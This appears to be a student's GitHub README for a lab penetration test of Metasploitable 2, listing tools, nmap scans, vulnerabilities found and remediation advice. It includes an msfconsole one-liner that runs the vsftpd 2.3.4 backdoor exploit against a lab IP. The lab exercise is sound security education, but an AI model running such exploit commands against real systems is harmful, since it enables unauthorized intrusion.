# Ethical Hacking Project: Network Penetration Testing

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-FD5200?style=for-the-badge)
![Nmap](https://img.shields.io/badge/Nmap-FFFFFF?style=for-the-badge&logo=nmap&logoColor=black)

## Project Overview
This repository documents a comprehensive penetration testing exercise conducted in a controlled lab environment. The project demonstrates real-world attack techniques against vulnerable systems and provides security remediation recommendations.

**Key Features:**
- Network reconnaissance with Nmap
- Vulnerability exploitation (FTP, SSH, SMTP)
- Privilege escalation techniques
- Password cracking with John the Ripper
- Detailed security remediation guide

## Project Details
| Category        | Details                          |
|-----------------|----------------------------------|
| **Student**     | Bibhanshu Kumar                 |
| **ERP**         | 6601911                         |
| **Course**      | B.Tech CSE (Cyber Security)     |
| **Institution** | [Your University Name]          |
| **Date**        | May 2025                        |

## Lab Environment
**Target System:**
- Metasploitable 2 (Ubuntu 8.04)
- Vulnerable services: vsftpd 2.3.4, OpenSSH 4.7p1, Postfix

**Attacker System:**
- Kali Linux 2025.1
- Tools: Nmap 7.94, Metasploit 6.4, John the Ripper 1.9.0

## Technical Documentation
The full project report is available as:
- [Ethical_Hacking_Project_Bibhanshu.pdf](Ethical%20Hacking%20Project%20(Bibhanshu).pdf)

**Key Sections:**
1. Network Scanning & Enumeration
2. Vulnerability Exploitation
3. Post-Exploitation Activities
4. Security Remediation Plan
5. Lessons Learned

# Basic network scan
nmap -v 192.168.112.0/24

# Service version detection
nmap -sV 192.168.112.129

# Exploit vulnerable FTP service
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.112.129; run"

Critical Vulnerabilities Found
VSFTPD 2.3.4 Backdoor (CVE-2011-2523)

OpenSSH 4.7p1 Weak Encryption

Postfix SMTPD Misconfigurations

Samba 3.x Information Disclosure

Security Recommendations
Upgrade all services to latest versions

Implement firewall rules to restrict unnecessary ports

Enforce strong password policies

Disable vulnerable protocols (Telnet, FTP)

Configure SMTP authentication properly
